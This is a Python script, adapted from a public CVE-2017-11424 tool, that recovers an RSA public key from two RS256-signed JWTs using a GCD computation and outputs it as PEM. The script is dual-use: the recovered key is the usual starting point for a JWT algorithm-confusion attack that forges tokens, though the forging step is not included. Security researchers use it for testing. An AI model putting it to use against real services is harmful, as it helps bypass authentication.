# Adapted from https://github.com/silentsignal/rsa_sign2n/blob/release/CVE-2017-11424/x_CVE-2017-11424.py
import base64
import binascii

import asn1tools
from Crypto.Hash import SHA256
from Crypto.Signature import (
    PKCS1_v1_5,  # god bless http://ratmirkarabut.com/articles/ctf-writeup-google-ctf-quals-2017-rsa-ctf-challenge/
)
from gmpy2 import c_div, gcd, mpz


def b64urldecode(b64):
    return base64.urlsafe_b64decode(b64 + ("=" * (len(b64) % 4)))


def bytes2mpz(b):
    return mpz(int(binascii.hexlify(b), 16))


def der2pem(der, token="RSA PUBLIC KEY"):
    der_b64 = base64.b64encode(der).decode("ascii")

    lines = [der_b64[i : i + 64] for i in range(0, len(der_b64), 64)]
    return "-----BEGIN %s-----\n%s\n-----END %s-----\n" % (
        token,
        "\n".join(lines),
        token,
    )


# e=mpz(65537) # Can be a couple of other common values
def generate_public_key(jwt0: str, jwt1: str) -> str:
    jwt0_sig_bytes = b64urldecode(jwt0.split(".")[2])
    jwt1_sig_bytes = b64urldecode(jwt1.split(".")[2])
    if len(jwt0_sig_bytes) != len(jwt1_sig_bytes):
        raise Exception(
            "Signature length mismatch"
        )  # Based on the mod exp operation alone, there may be some differences!

    jwt0_sig = bytes2mpz(jwt0_sig_bytes)
    jwt1_sig = bytes2mpz(jwt1_sig_bytes)

    jks0_input = ".".join(jwt0.split(".")[0:2])
    sha256_0 = SHA256.new(jks0_input.encode("ascii"))
    padded0 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_0, len(jwt0_sig_bytes))

    jks1_input = ".".join(jwt1.split(".")[0:2])
    sha256_1 = SHA256.new(jks1_input.encode("ascii"))
    padded1 = PKCS1_v1_5.EMSA_PKCS1_V1_5_ENCODE(sha256_1, len(jwt0_sig_bytes))

    m0 = bytes2mpz(padded0)
    m1 = bytes2mpz(padded1)

    pkcs1 = asn1tools.compile_files("pkcs1.asn", codec="der")
    x509 = asn1tools.compile_files("x509.asn", codec="der")

    for e in [mpz(3), mpz(65537)]:
        gcd_res = gcd(pow(jwt0_sig, e) - m0, pow(jwt1_sig, e) - m1)
        print("[*] GCD: ", hex(gcd_res))
        for my_gcd in range(1, 100):
            my_n = c_div(gcd_res, mpz(my_gcd))
            if pow(jwt0_sig, e, my_n) == m0:
                print("[+] Found n with multiplier", my_gcd, " :\n", hex(my_n))
                pkcs1_pubkey = pkcs1.encode(
                    "RSAPublicKey", {"modulus": int(my_n), "publicExponent": int(e)}
                )
                x509_der = x509.encode(
                    "PublicKeyInfo",
                    {
                        "publicKeyAlgorithm": {
                            "algorithm": "1.2.840.113549.1.1.1",
                            "parameters": None,
                        },
                        "publicKey": (pkcs1_pubkey, len(pkcs1_pubkey) * 8),
                    },
                )
                return der2pem(x509_der, token="PUBLIC KEY")
